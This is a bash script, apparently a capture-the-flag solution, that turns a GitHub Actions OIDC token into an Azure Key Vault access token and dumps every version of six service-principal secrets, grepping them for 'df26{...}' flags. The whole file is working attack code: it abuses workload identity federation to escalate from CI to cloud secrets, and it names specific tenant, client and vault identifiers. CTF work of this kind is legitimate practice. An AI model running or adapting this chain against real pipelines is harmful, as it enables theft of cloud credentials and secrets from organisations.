#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
PV=https://kv-tbl-prod-x3euoz.vault.azure.net
J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$J" --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
for n in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  echo "### $n"
  # full value + grep df26
  V=$(curl -sS "$PV/secrets/$n?api-version=7.4" -H "Authorization: Bearer $VT" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
  echo "   keys: $(printf '%s' "$V" | python3 -c 'import sys,json
try: print(list(json.loads(sys.stdin.read()).keys()))
except: print("<not json>")')"
  printf '%s' "$V" | grep -oiE "df26\{[^}]*\}" && echo "   <<<<< FLAG in $n value"
  # all versions
  echo "   versions:"
  for ver in $(curl -sS "$PV/secrets/$n/versions?api-version=7.4" -H "Authorization: Bearer $VT" | python3 -c 'import sys,json;[print(x["id"].split("/")[-1]) for x in json.load(sys.stdin).get("value",[])]' 2>/dev/null); do
    curl -sS "$PV/secrets/$n/$ver?api-version=7.4" -H "Authorization: Bearer $VT" | grep -oiE "df26\{[^}]*\}" && echo "      <<<<< FLAG in $n ver $ver"
  done
done
echo END
